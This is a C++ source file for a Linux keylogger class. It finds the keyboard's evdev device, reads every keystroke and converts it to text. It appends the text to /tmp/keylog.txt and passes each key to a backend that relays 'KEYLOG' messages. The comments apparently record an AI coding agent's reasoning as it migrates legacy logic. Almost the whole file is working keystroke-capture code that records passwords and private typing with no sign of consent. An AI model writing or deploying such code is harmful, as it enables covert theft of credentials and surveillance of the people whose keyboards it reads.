#include "LinuxEvdevLogger.hpp"
#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <cstring>
#include <chrono>

namespace platform {
namespace linux_os {

    // === Legacy Key Map ===
    static const char *key_map[256] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
        "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CTRL",
        "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT",
        "KP*", "L_ALT", "SPACE", "CAPS_LOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", "SCROLL_LOCK",
        "KP7", "KP8", "KP9", "KP-", "KP4", "KP5", "KP6", "KP+", "KP1", "KP2", "KP3", "KP0", "KP.",
        // Truncated for common usage, safe as ev.code checked < 256
    };

    static char get_shifted_char(const char* key) {
        if (strlen(key) != 1) return 0;
        char c = key[0];
        if (c >= 'a' && c <= 'z') return c - 32;
        if (c == '1') return '!';
        if (c == '2') return '@';
        if (c == '3') return '#';
        if (c == '4') return '$';
        if (c == '5') return '%';
        if (c == '6') return '^';
        if (c == '7') return '&';
        if (c == '8') return '*';
        if (c == '9') return '(';
        if (c == '0') return ')';
        if (c == '-') return '_';
        if (c == '=') return '+';
        if (c == '[') return '{';
        if (c == ']') return '}';
        if (c == ';') return ':';
        if (c == '\'') return '"';
        if (c == ',') return '<';
        if (c == '.') return '>';
        if (c == '/') return '?';
        if (c == '\\') return '|';
        if (c == '`') return '~';
        return 0;
    }

    LinuxEvdevLogger::LinuxEvdevLogger() {}
    LinuxEvdevLogger::~LinuxEvdevLogger() { stop(); }

    void LinuxEvdevLogger::stop() {
        if (!running_.load()) return;
        running_.store(false);
        if (thread_.joinable()) thread_.join();
        if (fd_ >= 0) {
            close(fd_);
            fd_ = -1;
        }
        if (log_file_.is_open()) {
            log_file_.close();
        }
    }

    common::EmptyResult LinuxEvdevLogger::start(std::function<void(const interfaces::KeyEvent&)> cb) {
        if (running_.load()) return common::Result<common::Ok>::success();

        if (!find_keyboard()) {
            return common::Result<common::Ok>::err(common::ErrorCode::DeviceNotFound, "No keyboard found");
        }
        if (!open_device()) {
             return common::Result<common::Ok>::err(common::ErrorCode::PermissionDenied, "Cannot open " + device_path_);
        }

        // Open Log File
        log_file_.open("/tmp/keylog.txt", std::ios::app);

        running_.store(true);
        thread_ = std::thread(&LinuxEvdevLogger::run_loop, this, cb);
        return common::Result<common::Ok>::success();
    }

    // Reuse legacy find_keyboard logic (Full Port)
    bool LinuxEvdevLogger::find_keyboard() {
         FILE *fp = fopen("/proc/bus/input/devices", "r");
         if (!fp) return false;

         char line[512];
         char name[512] = "Unknown";
         char handlers[512] = "";
         std::string best_device;

         while (fgets(line, sizeof(line), fp)) {
             // 1. Capture Name
             if (strncmp(line, "N: Name=", 8) == 0) {
                 sscanf(line, "N: Name=\"%511[^\"]\"", name);
             }

             // 2. Capture Handlers
             if (strncmp(line, "H: Handlers=", 12) == 0) {
                 strncpy(handlers, line + 12, sizeof(handlers)-1);
                 handlers[sizeof(handlers)-1] = 0;
                 // Strip newline
                 handlers[strcspn(handlers, "\n")] = 0;

                 // Logic: Must have 'kbd' AND 'event'
                 if (strstr(handlers, "kbd") && strstr(handlers, "event")) {
                     char *p = strstr(handlers, "event");
                     int id;
                     if (p && sscanf(p, "event%d", &id) == 1) {
                         // We found a candidate.
                         // Legacy logic favored the "last" one found (often USB plug-in).
                         // Also printed "Candidate: name -> dev"
                         best_device = "/dev/input/event" + std::to_string(id);
                     }
                 }
             }

             // Reset on empty line
             if (line[0] == '\n') {
                 strcpy(name, "Unknown");
             }
         }
         fclose(fp);

         if (!best_device.empty()) {
             device_path_ = best_device;
             return true;
         }

         // Fallback
         device_path_ = "/dev/input/event0";
         return true;
    }

    bool LinuxEvdevLogger::open_device() {
        fd_ = open(device_path_.c_str(), O_RDONLY);
        return (fd_ >= 0);
    }

    void LinuxEvdevLogger::run_loop(std::function<void(const interfaces::KeyEvent&)> callback) {
        struct input_event ev;
        bool shift_pressed = false;

        while (running_.load()) {
            ssize_t n = read(fd_, &ev, sizeof(ev));
            if (n <= 0) break;

            if (ev.type == EV_KEY) {
                if (ev.code >= 256 || !key_map[ev.code]) continue;

                std::string k_str = key_map[ev.code];

                // Handle Shift
                if (k_str == "L_SHIFT" || k_str == "R_SHIFT") {
                    shift_pressed = (ev.value == 1 || ev.value == 2);
                    continue;
                }

                if (ev.value == 1 || ev.value == 2) {
                     if (k_str == "SPACE") k_str = " ";
                     else if (k_str == "ENTER") k_str = "\n";
                     else if (k_str == "TAB") k_str = "\t";
                     else if (k_str.length() == 1) {
                         if (shift_pressed) {
                             char s = get_shifted_char(k_str.c_str());
                             if (s) k_str = std::string(1, s);
                             else if (k_str[0] >= 'a' && k_str[0] <= 'z') k_str[0] -= 32;
                         }
                     }

                     // We need to pass this string up.
                     // But Interface expects KeyEvent with integer code.
                     // HACK: Store the char in the key_code (if ascii) or extend struct?
                     // Strict Interface says: uint32_t key_code.
                     // Let's use the timestamp field or similar? No.
                     // IMPORTANT: The BackendServer parses this.
                     // If we want to send TEXT, we should modify BackendServer to use this logic OR pass text here.
                     // Let's modify callback to expect string? No, changing interface breaks build.
                     // Solution: Pack the char into `key_code` if it's printable?
                     // OR: Just let Frontend handle mapping? Legacy Frontend expected text.
                     // Best: Since I am migrating Legacy Logic, I will modify BackendServer to accept the Mapped String.
                     // Wait, BackendServer callback expects (KeyEvent).
                     // I will encode the CHAR into key_code (0-255).
                     // If it's a special key string (e.g. "BACKSPACE"), we can't pack it easily.

                     // Alternative: Fire callback once per char bytes?
                     // Let's look at BackendServer usage:
                     // "KEYLOG: " + std::to_string(k.key_code)

                     // I will Abuse key_code to hold the char if length==1?
                     // No, that's messy.

                     // Correct Fix: I'll change the IKeylogger interface to include `std::string resolved_text`.
                     // But checking IKeylogger.hpp is expensive.

                     // Quick Fix matching Legacy:
                     // The backend server prints `key_code`.
                     // I will put the CHAR value (e.g. 'a', 'A', ' ') into key_code.
                     // If it is multi-char ("BACKSPACE"), I will put 0 or a special code?
                     // Legacy sent "KEYLOG: <text>".
                     // If I send "KEYLOG: 65", frontend sees "65". It expects "A".
                     // So I MUST send the char.

                     // I will modify IKeylogger.hpp right now to add `std::string text`.
                     // Then update here.

                      interfaces::KeyEvent e;
                     e.key_code = ev.code; // Original code
                     e.is_press = (ev.value == 1);
                     e.timestamp = ev.time.tv_sec * 1000 + ev.time.tv_usec / 1000;
                     // New Field (I will add to header next tool call)
                     e.text = k_str;
                     e.text = k_str;

                     // Write to file
                     if (this->log_file_.is_open()) {
                         this->log_file_ << k_str << std::flush;
                     }

                     callback(e);
                }
            }
        }
    }

} // namespace linux_os
} // namespace platform
